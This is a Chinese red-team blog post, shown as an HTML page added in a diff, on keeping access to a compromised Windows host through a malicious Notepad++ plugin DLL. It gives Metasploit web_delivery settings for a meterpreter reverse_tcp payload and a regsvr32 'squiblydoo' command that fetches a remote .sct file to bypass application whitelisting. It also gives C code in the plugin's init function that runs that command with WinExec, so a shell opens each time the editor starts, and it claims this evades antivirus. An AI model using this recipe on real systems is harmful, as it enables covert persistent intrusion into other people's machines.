@@ -1,0 +1,286 @@
+<html>
+<head>
+    <meta charset="utf-8" />
+<meta name="description" content="" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+
+<title>权限维持之notepad++ | 6right</title>
+
+<link rel="shortcut icon" href="https://liangyueliangyue.github.io/favicon.ico?v=1686021349967">
+
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://liangyueliangyue.github.io/styles/main.css">
+<!-- <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/css/bootstrap.min.css"> -->
+
+<script src="https://cdn.jsdelivr.net/npm/@highlightjs/cdn-assets/highlight.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages/dockerfile.min.js"></script>
+<script src="https://cdn.bootcdn.net/ajax/libs/highlight.js/9.12.0/languages//dart.min.js"></script>
+
+<!-- <script src="https://cdn.jsdelivr.net/npm/moment@2.27.0/moment.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script> -->
+<!-- <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.0/dist/js/bootstrap.min.js"></script> -->
+<!-- DEMO JS -->
+<!--<script src="media/scripts/index.js"></script>-->
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.css">
+</head>
+<body>
+<div class="main gt-bg-theme-color-first">
+    <nav class="navbar navbar-expand-lg">
+    <a class="navbar-brand" href="/">
+        <img class="user-avatar" src="/images/avatar.png" alt="头像">
+        <div class="site-name gt-c-content-color-first">
+            6right
+        </div>
+    </a>
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
+        aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation" id="changeNavbar">
+        <i class="fas fa-bars gt-c-content-color-first" style="font-size: 18px"></i>
+    </button>
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+        <div class="navbar-nav mr-auto" style="text-align: center">
+            
+            <div class="nav-item">
+                
+                <a href="/" class="menu gt-a-link">
+                    首页
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/archives" class="menu gt-a-link">
+                    归档
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/tags" class="menu gt-a-link">
+                    标签
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/post/about" class="menu gt-a-link">
+                    关于
+                </a>
+                
+            </div>
+            
+            <div class="nav-item">
+                
+                <a href="/friends" class="menu gt-a-link">
+                    友链
+                </a>
+                
+            </div>
+            
+        </div>
+        <div style="text-align: center">
+            <form id="gridea-search-form" style="position: relative" data-update="1686021349967"
+                action="/search/">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" placeholder="搜索文章" />
+                <i class="fas fa-search gt-c-content-color-first" style="position: absolute; top: 9px; left: 10px;"></i>
+            </form>
+        </div>
+    </div>
+</nav>
+<script>
+    /* 移动端导航栏展开/收起切换 */
+    document.getElementById('changeNavbar').onclick = () => {
+        var element = document.getElementById('navbarSupportedContent');
+        if (element.style.display === 'none' || element.style.display === '') {
+            element.style.display = 'block';
+        } else {
+            element.style.display = 'none';
+        }
+    }
+</script>
+
+    <div class="post-container">
+        <div class="post-detail gt-bg-theme-color-second">
+            <article class="gt-post-content">
+                <h2 class="post-title">
+                    权限维持之notepad++
+                </h2>
+                <div class="post-info">
+                    <time class="post-time gt-c-content-color-first">
+                        · 2022-02-22 ·
+                    </time>
+                    
+                        <a href="https://liangyueliangyue.github.io/tag/qhrlgmGxH/" class="post-tags">
+                            # 内网渗透
+                        </a>
+                    
+                </div>
+                <div class="post-content">
+                    <h1 id="notepad插件">notepad++插件</h1>
+<p>Notepad++ 插件可用于扩展 Notepad++ 的功能。默认情况下，用户可以在 Notepad++ 中下载已批准的插件列表，但也允许自定义插件，无需任何验证，从而为开发人员提供扩展文本编辑器使用的灵活性。插件具有 DLL 文件的形式，并存储在以下路径中：</p>
+<pre><code>%PROGRAMFILES%\Notepad++\plugins
+</code></pre>
+<p>应该注意的是，为了加载插件，文件夹和 DLL 需要具有相同的名称。</p>
+<p>如：</p>
+<figure data-type="image" tabindex="1"><img src="https://img-blog.csdnimg.cn/img_convert/81ed7d365466452c51f97a2e32f2b5ed.png" alt="image-20220218233227318" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://img-blog.csdnimg.cn/img_convert/534141da5ccaf341b9e32e1bfab5b5b2.png" alt="image-20220218233232899" loading="lazy"></figure>
+<p>对于红队操作员来说，不需要从头开始编写恶意插件，当在 notepad++ 中输入字符时， <em>SCI_ADDTEXT</em> API 将触发自定义命令。在以下示例中，在插入字符期间将出现一个消息框。</p>
+<pre><code>git clone https://github.com/npp-plugins/plugintemplate.git
+</code></pre>
+<p>项目提供了visual studio的项目文件<code>vs.proj/NppPluginTemplate.vcxproj</code>，直接双击打开，重定向项目的窗口记得选择确定。</p>
+<figure data-type="image" tabindex="3"><img src="https://img-blog.csdnimg.cn/img_convert/9b0586f4f1ce5ca26f6a4f4399e50b3e.png" alt="image-20220218235128649" loading="lazy"></figure>
+<p>然后就可以开始愉快的写代码了。模板中提示较为完善，根据提示首先打开<code>PluginDefinition.h</code>，可以自定义插件的名称和功能数量。<br>
+<img src="https://img-blog.csdnimg.cn/f29749820385468581a17e00d4574865.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATHkncw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<p>这里名字随便起，不重要。由于我们没什么真正需要实现的功能，这里可以不改，模板默认带两个测试功能（不能为0)，随便填一个功能。然后打开<code>PluginDefinition.cpp</code>，<code>commandMenuInit</code>函数中是用来设置功能和菜单栏中对应按钮的，模板中默认就带了两个测试功能也可以不改。真正需要实现的持久化功能可以填写在<code>pluginInit</code>方法中，notepad++打开会自动加载这些dll，然后调用<code>pluginInit</code>等函数。例如这里添加一个MessageBox。</p>
+<pre><code>void pluginInit(HANDLE /*hModule*/)
+{
+    MessageBox(NULL, TEXT(&quot;test&quot;), TEXT(&quot;test&quot;), NULL);
+}
+</code></pre>
+<p>编译后生成<code>NppPluginTemplate.dll</code>文件。在notepad++的plugins目录下新建一个目录用来放这个dll，假如给这个目录起名为<code>SecTest</code>，则将<code>NppPluginTemplate.dll</code>文件拖到<code>SecTest</code>目录下并重命名为<code>SecTest.dll</code>即可（名字要一致，否则不加载），重启notepad++即可生效。</p>
+<figure data-type="image" tabindex="4"><img src="https://img-blog.csdnimg.cn/img_convert/59f5e0574b0fecf9e53826880ef80438.png" alt="image-20220218235652444" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://img-blog.csdnimg.cn/img_convert/ba7b719464d5981431fc56b3ee430580.png" alt="image-20220218235758880" loading="lazy"></figure>
+<p>开启成功弹窗</p>
+<figure data-type="image" tabindex="6"><img src="https://img-blog.csdnimg.cn/img_convert/0cc7304c18a683eaf1a5ecc24af6fc6d.png" alt="image-20220218235816901" loading="lazy"></figure>
+<p>权限维持需要使用regsrv32.exe绕过应用程序白名单</p>
+<h2 id="0x00-regsvr简介"><strong>0x00 regsvr简介</strong></h2>
+<p>regsvr32表示Microsoft注册服务。它是Windows的命令行实用工具。虽然regsvr32有时会导致问题出现，但它是Windows系统文件中的一个重要文件。该文件位于C:\Windows的子文件夹中。该文件能够被查看，跟踪和影响其他程序。它主要用于在Windows文件扩展名中注册和取消注册程序，因为它是.exe，它的进程广泛地应用到OLE（对象链接和嵌入）、DLL（数据链接库）和OCX（ActiveX控制模块）中。上述进程在后台运行，可以通过任务管理器看到。它是微软的可信文件之一。</p>
+<h2 id="0x01-regsvr运行">0x01 regsvr运行</h2>
+<p>当你通过regsvr32中注册一个dll文件时，有关与regsvr32关联的程序的信息将会被添加到Windows中。然后访问这些进程查看器以了解程序数据的位置以及如何与程序数据进行交互。在注册一个dll文件时，会将信息添加到目录中，以便Windows可以使用它。这些文件的整个路径在字面上都有可执行代码，因此Windows可以调用特定的函数。这些文件非常方便，因为当软件更新时，这些文件会自动调用更新的版本；简而言之，它有助于避免软件的版本问题。通常，除了注册和注销dll文件外，此文件不常用</p>
+<p>RegSvr32.exe具有以下命令行选项：</p>
+<p><em>语法： Regsvr32 [/s][/u] [/n] [/i[:cmdline]] <dllname></em></p>
+<p>/ u - 取消注册server<br>
+/ i - 调用DllInstall传递一个可选的[cmdline]; 当它与/u一起使用时，调用dll uninstall<br>
+/ n - 不要调用DllRegisterServer; 此选项必须与/i一起使用<br>
+/ s - Silent；不显示消息框</p>
+<h2 id="0x02-攻击regsvr的多种方法">0x02 攻击regsvr的多种方法</h2>
+<ul>
+<li>Web delivery</li>
+<li>Empire</li>
+<li>Manual</li>
+<li>MSFVenom</li>
+<li>Koadic</li>
+<li>JSRat</li>
+<li>GreatSCT</li>
+</ul>
+<h3 id="web-delivery">Web Delivery</h3>
+<p>该模块可以快速启动一个为payload提供服务的Web服务器。提供的命令将允许下载和执行payload。它将通过指定的脚本语言解析器或Regsvr32使用squiblydoo技术绕过应用程序白名单。此模块的主要目的是当攻击者必须手动输入命令（例如命令注入）时，快速在目标计算机上建立会话:例如命令注入。</p>
+<p>Regsvr32使用squiblydoo技术绕过应用程序白名单。签名的Microsoft二进制文件Regsvr32能够运行**.sct**文件，然后在其中执行包含PowerShell命令。两个Web请求（即.sct文件和PowerShell下载/执行）都可以在同一端口上执行。“PSH（Binary）”会将文件写入到硬盘中，允许自定义二进制文件被下载和执行。</p>
+<pre><code>use exploit/multi/script/web_delivery
+set target 3
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.0.0.3
+set LPORT 4444
+run
+</code></pre>
+<figure data-type="image" tabindex="7"><img src="https://img-blog.csdnimg.cn/img_convert/952979b0962747da36a4ca86d7a2cb69.png" alt="image-20220219003459872" loading="lazy"></figure>
+<p>一旦该exploit被执行，您将拥有一个为您创建的URL。在受害者pc的命令提示符中运行该URL，如下所示：</p>
+<pre><code>regsvr32 /s /n /u /i:http://192.168.159.132:8080/c7jRfbZFWR2T.sct scrobj.dll
+</code></pre>
+<p>现在是用C去执行该语句</p>
+<pre><code>void pluginInit(HANDLE /*hModule*/)
+{
+    WinExec(&quot;regsvr32 /s /n /u /i:http://192.168.159.132:8080/c7jRfbZFWR2T.sct scrobj.dll&quot;, SW_SHOW);
+}
+</code></pre>
+<p>即可实现调用notepad++即可拿到shell</p>
+<h1 id="后记">后记</h1>
+<p>这里只进行了简单测试，因为是直接调用DLL，所以可以进行免杀<br>
+但前提必须是拥有文件上传的权限，所以用来做权限维持即可</p>
+<p>这是一种思路，说明其他的可拓展的软件也都可能会有权限维持的利用空间</p>
+
+                </div>
+            </article>
+        </div>
+
+        
+            <div class="next-post">
+                <div class="next gt-c-content-color-first">下一篇</div>
+                <a href="https://liangyueliangyue.github.io/post/flash-diao-yu/" class="post-title gt-a-link">
+                    Flash钓鱼
+                </a>
+            </div>
+        
+
+        
+            <span id="/post/quan-xian-wei-chi-zhi-notepad/" class="leancloud_visitors" data-flag-title="权限维持之notepad++">
+                <em class="post-meta-item-text">阅读量 </em>
+                <i class="leancloud-visitors-count">0</i>
+            </span>
+        
+
+        
+
+        
+            <script src='https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js'></script>
+
+<style>
+	div#vcomments{
+		width:100%;
+		max-width: 1000px;
+		padding: 2.5%
+	}
+</style>
+
+
+	<div id="vcomments"></div>
+
+<script>
+	new Valine({
+		el: '#vcomments',
+		appId: 'QR1YL8ep02tLdNVejam0Whhv-gzGzoHsz',
+		appKey: 'I37Ekl4E78WEw4EpQ5WRlzxL',
+		avatar: 'monsterid',
+		pageSize: 5,
+		recordIp: false,
+		placeholder: '留下你的评论！',
+		visitor: true,
+	});
+</script>
+
+        
+
+        <div class="site-footer gt-c-content-color-first">
+    <div class="slogan gt-c-content-color-first">温润如玉</div>
+    <div class="social-container">
+        
+            
+                <a href="https://github.com/liangyueliangyue" target="_blank">
+                    <i class="fab fa-github gt-c-content-color-first"></i>
+                </a>
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+            
+        
+    </div>
+    <div class="footer-info">
+        Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+    </div>
+    <div>
+        Theme <a href="https://github.com/imhanjie/gridea-theme-pure" target="_blank">Pure</a>, Powered by <a
+                href="https://gridea.dev" target="_blank">Gridea</a> | <a href="https://liangyueliangyue.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+</div>
+
+<script>
+  hljs.highlightAll()
+</script>
+
+    </div>
+</div>
+</body>
+</html>
